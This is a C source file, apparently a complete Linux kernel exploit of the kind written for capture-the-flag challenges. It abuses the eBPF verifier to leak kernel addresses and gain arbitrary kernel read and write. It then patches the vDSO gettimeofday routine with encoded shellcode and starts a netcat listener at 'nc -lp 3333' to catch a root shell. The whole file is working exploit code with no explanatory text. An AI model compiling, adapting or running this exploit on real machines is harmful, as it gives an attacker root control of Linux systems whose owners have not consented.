// gcc last.c -o last -static

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <sys/personality.h>
#include <sys/prctl.h>
#include "linux/bpf.h"
#include "bpf_insn.h"

#include <sys/auxv.h>

#define BPF_JMP32 0x06
#define BPF_JLT 0xa0
#define BPF_OBJ_GET_INFO_BY_FD 15
#define BPF_MAP_TYPE_STACK 0x17

#define BPF_ALU64_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })
#define BPF_ALU32_IMM(OP, DST, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })
#define BPF_ALU32_REG(OP, DST, SRC)				\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV64_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV32_REG(DST, SRC)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MOV64_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU64 | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_MOV32_IMM(DST, IMM)					\
	((struct bpf_insn) {					\
		.code  = BPF_ALU | BPF_MOV | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = IMM })

#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_LD | BPF_DW | BPF_IMM,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = 0,					\
		.imm   = (__u32) (IMM) }),			\
	((struct bpf_insn) {					\
		.code  = 0, 					\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = ((__u64) (IMM)) >> 32 })

#ifndef BPF_PSEUDO_MAP_FD
# define BPF_PSEUDO_MAP_FD	1
#endif

#define BPF_LD_IMM64(DST, IMM)					\
	BPF_LD_IMM64_RAW(DST, 0, IMM)

#define BPF_LD_MAP_FD(DST, MAP_FD)				\
	BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)				\
	((struct bpf_insn) {					\
		.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

/* Unconditional jumps, goto pc + off16 */

#define BPF_JMP_A(OFF)						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_JA,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_JMP32_REG(OP, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_X,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */

#define BPF_JMP32_IMM(OP, DST, IMM, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,	\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_JMP_REG(OP, DST, SRC, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_X,		\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

#define BPF_JMP_IMM(OP, DST, IMM, OFF)				\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_OP(OP) | BPF_K,		\
		.dst_reg = DST,					\
		.src_reg = 0,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)			\
	((struct bpf_insn) {					\
		.code  = CODE,					\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = IMM })

#define BPF_EXIT_INSN()						\
	((struct bpf_insn) {					\
		.code  = BPF_JMP | BPF_EXIT,			\
		.dst_reg = 0,					\
		.src_reg = 0,					\
		.off   = 0,					\
		.imm   = 0 })

#define BPF_MAP_GET(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_LDX_MEM(BPF_DW, (dst), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */

#define BPF_MAP_GET_ADDR(idx, dst)                                                        \
	BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */   \
	BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */   \
	BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */   \
	BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx),           /* *(u32 *)(fp - 4) = idx */   \
	BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),             \
	BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */   \
	BPF_EXIT_INSN(),                                  /*   exit(0);             */   \
	BPF_MOV64_REG((dst), BPF_REG_0)          	  /* r_dst = (r0)   */

/* Memory load, dst_reg = *(uint *) (src_reg + off16) */

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })

/* Memory store, *(uint *) (dst_reg + off16) = src_reg */

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)			\
	((struct bpf_insn) {					\
		.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,	\
		.dst_reg = DST,					\
		.src_reg = SRC,					\
		.off   = OFF,					\
		.imm   = 0 })


char buffer[64];
int sockets[2];
int progfd;
int ctrl_mapfd, exp_mapfd;
int doredact = 0;

#define LOG_BUF_SIZE 0x100000
char bpf_log_buf[LOG_BUF_SIZE];

uint64_t ctrl_buf[0x100];
uint64_t exp_buf[0x3000];
char info[0x100];
#define RADIX_TREE_INTERNAL_NODE 2
#define RADIX_TREE_MAP_MASK 0x3f

static __u64 ptr_to_u64(void *ptr)
{
    return (__u64) (unsigned long) ptr;
}

int bpf_prog_load(enum bpf_prog_type prog_type,
                  const struct bpf_insn *insns, int prog_len,
                  const char *license, int kern_version)
{
    union bpf_attr attr = {
            .prog_type = prog_type,
            .insns = ptr_to_u64((void *) insns),
            .insn_cnt = prog_len / sizeof(struct bpf_insn),
            .license = ptr_to_u64((void *) license),
            .log_buf = ptr_to_u64(bpf_log_buf),
            .log_size = LOG_BUF_SIZE,
            .log_level = 1,
    };

    attr.kern_version = kern_version;

    bpf_log_buf[0] = 0;

    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
                   int max_entries, int map_flags)
{
    union bpf_attr attr = {
            .map_type = map_type,
            .key_size = key_size,
            .value_size = value_size,
            .max_entries = max_entries
    };

    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(uint64_t key, void *value, int mapfd, uint64_t flags)
{
    union bpf_attr attr = {
            .map_fd = mapfd,
            .key = (__u64)&key,
            .value = (__u64)value,
            .flags = flags,
    };

    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

static int bpf_lookup_elem(void *key, void *value, int mapfd)
{
    union bpf_attr attr = {
            .map_fd = mapfd,
            .key = (__u64)key,
            .value = (__u64)value,
    };

    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static uint32_t bpf_map_get_info_by_fd(uint64_t key, void *value, int mapfd, void *info)
{
    union bpf_attr attr = {
            .map_fd = mapfd,
            .key = (__u64)&key,
            .value = (__u64)value,
            .info.bpf_fd = mapfd,
            .info.info_len = 0x100,
            .info.info = (__u64)info,
    };

    syscall(__NR_bpf, BPF_OBJ_GET_INFO_BY_FD, &attr, sizeof(attr));

    return *(uint32_t *)((char *)info+0x40);
}


static void __exit(char *err)
{
    fprintf(stderr, "error: %s\n", err);
    exit(-1);
}


static int load_my_prog()
{
    struct bpf_insn my_prog[] = {

            BPF_LD_MAP_FD(BPF_REG_9,ctrl_mapfd),
            BPF_MAP_GET(0,BPF_REG_8), //1	
            BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),          	  /* r_dst = (r0)   */

            BPF_LD_IMM64(BPF_REG_2,0x4000000000),
            BPF_LD_IMM64(BPF_REG_3,0x2000000000),
            BPF_LD_IMM64(BPF_REG_4,0xFFFFffff),
            BPF_LD_IMM64(BPF_REG_5,0x1),

            BPF_JMP_REG(BPF_JGT,BPF_REG_8,BPF_REG_2,5),
            BPF_JMP_REG(BPF_JLT,BPF_REG_8,BPF_REG_3,4),
            BPF_JMP32_REG(BPF_JGT,BPF_REG_8,BPF_REG_4,3),
            BPF_JMP32_REG(BPF_JLT,BPF_REG_8,BPF_REG_5,2),

            BPF_ALU64_REG(BPF_AND,BPF_REG_8,BPF_REG_4),
            BPF_JMP_IMM(BPF_JA, 0, 0, 2),

            BPF_MOV64_IMM(BPF_REG_0,0x0),
            BPF_EXIT_INSN(),

            //-------- exp_mapfd
            BPF_LD_MAP_FD(BPF_REG_9,exp_mapfd),
            BPF_MAP_GET_ADDR(0,BPF_REG_7), //2	
            BPF_ALU64_REG(BPF_SUB,BPF_REG_7,BPF_REG_8),

            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0),
            BPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x10),

            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_7,0xc0),
            BPF_STX_MEM(BPF_DW,BPF_REG_6,BPF_REG_0,0x18),

            BPF_ALU64_IMM(BPF_ADD,BPF_REG_0,0x50),

            // &ctrl[0]+0x8 -> op 1:read 2:write
            BPF_LDX_MEM(BPF_DW,BPF_REG_8,BPF_REG_6,0x8),  // r8 = op
            BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 1, 4),    //3       

            // arbitrary read
            BPF_LDX_MEM(BPF_DW,BPF_REG_0,BPF_REG_6,0x20),  // r8 = op
            BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0x40),

            BPF_MOV64_IMM(BPF_REG_0,0x0),
            BPF_EXIT_INSN(),

            BPF_JMP_IMM(BPF_JNE, BPF_REG_8, 2, 4),    //3       

            // arbitrary write
            BPF_STX_MEM(BPF_DW,BPF_REG_7,BPF_REG_0,0),
            BPF_ST_MEM(BPF_W,BPF_REG_7,0x18,BPF_MAP_TYPE_STACK),//map type
            BPF_ST_MEM(BPF_W,BPF_REG_7,0x24,-1),// max_entries
            BPF_ST_MEM(BPF_W,BPF_REG_7,0x2c,0x0), //lock_off

            BPF_MOV64_IMM(BPF_REG_0,0x0),
            BPF_EXIT_INSN(),

    };
    return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,my_prog,sizeof(my_prog),"GPL",0);
}

static void prep(void)
{
    ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x100,1,0);
    if(ctrl_mapfd < 0){
        __exit(strerror(errno));
    }

    exp_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,sizeof(int),0x2000,1,0);
    if(ctrl_mapfd < 0){
        __exit(strerror(errno));
    }

    printf("ctrl_mapfd:%d, exp_mapfd:%d\n", ctrl_mapfd, exp_mapfd);

    progfd =  load_my_prog();
    if(progfd < 0){
        printf("%s\n",bpf_log_buf);
        __exit(strerror(errno));
    }
    //printf("%s\n",bpf_log_buf);

    if(socketpair(AF_UNIX,SOCK_DGRAM,0,sockets)){
        __exit(strerror(errno));
    }

    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0){
        __exit(strerror(errno));
    }
}


static void writemsg(void)
{
    char buffer[64];

    ssize_t n = write(sockets[0], buffer, sizeof(buffer));

    if (n < 0) {
        perror("write");
        return;
    }
    if (n != sizeof(buffer))
        fprintf(stderr, "short write: %lu\n", n);
}

static void update_elem(uint32_t op)
{
    ctrl_buf[0] = 0x2000000000+0x110;
    ctrl_buf[1] = op;

    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);
    bpf_update_elem(0, exp_buf, exp_mapfd, 0);
    writemsg();
}

static uint64_t infoleak(uint64_t *buffer, int mapfd)
{
    uint64_t key = 0;
    if (bpf_lookup_elem(&key, buffer, mapfd))
        __exit(strerror(errno));
}


static uint32_t arbitrary_read(uint64_t addr){
    uint32_t read_info;

    ctrl_buf[0] = 0x2000000000+0x110;
    ctrl_buf[1] = 1;
    ctrl_buf[4] = addr - 0x58;

    bpf_update_elem(0, ctrl_buf, ctrl_mapfd, 0);
    bpf_update_elem(0, exp_buf, exp_mapfd, 0);
    writemsg();

    read_info =  bpf_map_get_info_by_fd(0, exp_buf, exp_mapfd, info);
    return read_info;
}


static uint64_t read_8byte(uint64_t addr){

    uint32_t addr_low = arbitrary_read(addr);
    uint32_t addr_high = arbitrary_read(addr + 0x4);
    return ((uint64_t)addr_high << 32) | addr_low;
}

static void pwn(void)
{

    uint64_t leak_addr, kernel_base;
    uint32_t read_low, read_high;

    //----------------leak info----------------------- 
    //

    update_elem(0);

    infoleak(ctrl_buf, ctrl_mapfd);

    uint64_t map_leak = ctrl_buf[2];
    printf("[+] leak array_map_ops:0x%lX\n", map_leak);
    kernel_base = map_leak - 0x1016480;
    printf("[+] leak kernel_base addr:0x%lX\n", kernel_base);

    uint64_t elem_leak = ctrl_buf[3] - 0xc0 +0x110;
    printf("[+] leak exp_map_elem addr:0x%lX\n", elem_leak);

    // ---------------------------arbitrary read --------------------
    //

    uint64_t init_pid_ns_str,init_pid_ns_ptr, start_search, addr,vdso_addr;
    start_search = kernel_base + 0x12f0000;
//morty
    for (int i = 0xffffffff822b0000; i < 0xffffffffffff0000; i += 0x1000) {
        read_low = arbitrary_read(i);
        if (read_low == 0x464c457f) {       // 验证elf格式
            read_low = arbitrary_read(i+0x2f8);
            if (read_low == 0x74746567) {           //验证"gettimeofday"
                vdso_addr = i;
                printf("[+] --vdso addr : 0x%lx\n", vdso_addr);
                break;
            }
        }
    }


    //----------------------------arbitrary write----------------------
    uint64_t fake_map_ops[] = {
            kernel_base + 0x16ceb0,
            kernel_base + 0x16dd70,
            0,
            kernel_base + 0x16d650,
            kernel_base + 0x16cfa0,//get net key 5
            0x0,
            0x0,
            kernel_base + 0x16d020,
            kernel_base + 0x16d540,
            kernel_base + 0x16cfd0,
            kernel_base + 0x16cfa0,//map_push_elem 15
            0x0,
            0x0,
            0x0,
            0x0,
            kernel_base + 0x16d2a0,
            0x0,
            kernel_base + 0x16d0d0,
            kernel_base + 0x16dbe0,
            0x0,
            0x0,
            0x0,
            kernel_base + 0x16cf30,
            kernel_base + 0x16cf60,
            kernel_base + 0x16d0a0,
    };
    memcpy(exp_buf, fake_map_ops, sizeof(fake_map_ops));

    update_elem(2);

    exp_buf[0] = 0x31485390-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*0);//0xffffffff822c0730
    exp_buf[0] = 0x0f66b0c0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*1);
    exp_buf[0] = 0xdb314805-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*2);
    exp_buf[0] = 0x75c33948-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*3);
    exp_buf[0] = 0xc031480f-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*4);
    exp_buf[0] = 0x050f39b0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*5);
    exp_buf[0] = 0x48db3148-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*6);
    exp_buf[0] = 0x0974d839-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*7);
    exp_buf[0] = 0xc031485b-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*8);
    exp_buf[0] = 0x050f60b0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*9);
    exp_buf[0] = 0xd23148c3-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*10);
    exp_buf[0] = 0x6a5e016a-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*11);
    exp_buf[0] = 0x296a5f02-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*12);
    exp_buf[0] = 0x48050f58-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*13);
    exp_buf[0] = 0xb9485097-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*14);
    exp_buf[0] = 0xfaf2fffd-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*15);
    exp_buf[0] = 0xfeffff80-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*16);
    exp_buf[0] = 0x51d1f748-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*17);
    exp_buf[0] = 0x6ae68948-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*18);
    exp_buf[0] = 0x2a6a5a10-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*19);
    exp_buf[0] = 0x48050f58-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*20);
    exp_buf[0] = 0x3948db31-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*21);
    exp_buf[0] = 0x480774d8-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*22);
    exp_buf[0] = 0xe7b0c031-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*23);
    exp_buf[0] = 0x6a90050f-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*24);
    exp_buf[0] = 0x216a5e03-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*25);
    exp_buf[0] = 0xceff4858-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*26);
    exp_buf[0] = 0xf675050f-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*27);
    exp_buf[0] = 0x50c03148-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*28);
    exp_buf[0] = 0x9dd0bb48-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*29);
    exp_buf[0] = 0x8cd09196-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*30);
    exp_buf[0] = 0xf748ff97-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*31);
    exp_buf[0] = 0x894853d3-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*32);
    exp_buf[0] = 0x485750e7-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*33);
    exp_buf[0] = 0x3148e689-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*34);
    exp_buf[0] = 0x0f3bb0d2-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*35);
    exp_buf[0] = 0xc0314805-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*36);
    exp_buf[0] = 0x050fe7b0-1;
    bpf_update_elem(0, exp_buf, exp_mapfd, vdso_addr+0x730+0x4*37);
}

void get_shell(){
    int test;
    size_t result=0;
    unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);
    result=memmem(sysinfo_ehdr,0x1000,"gettimeofday",12);
    printf("[+]VDSO : %p\n",sysinfo_ehdr);
    printf("[+]The offset of gettimeofday is : %x\n",result-sysinfo_ehdr);
    
    if (sysinfo_ehdr!=0){
        for (int i=0x730;i<0x830;i+=1){
            printf("%02x ",*(unsigned char *)(sysinfo_ehdr+i));
        }
    }
    if(fork() == 0){
        printf("gettimeofday\n");
        sleep(1);
        //gettimeofday();
        void (*gettimeofday_addr)();
        gettimeofday_addr = 0x730 + getauxval(AT_SYSINFO_EHDR);
        gettimeofday_addr();
        exit(-1);
    }
    system("nc -lp 3333");

}

int main(void){

    prep();
    pwn();
    get_shell();
    return 0;
}



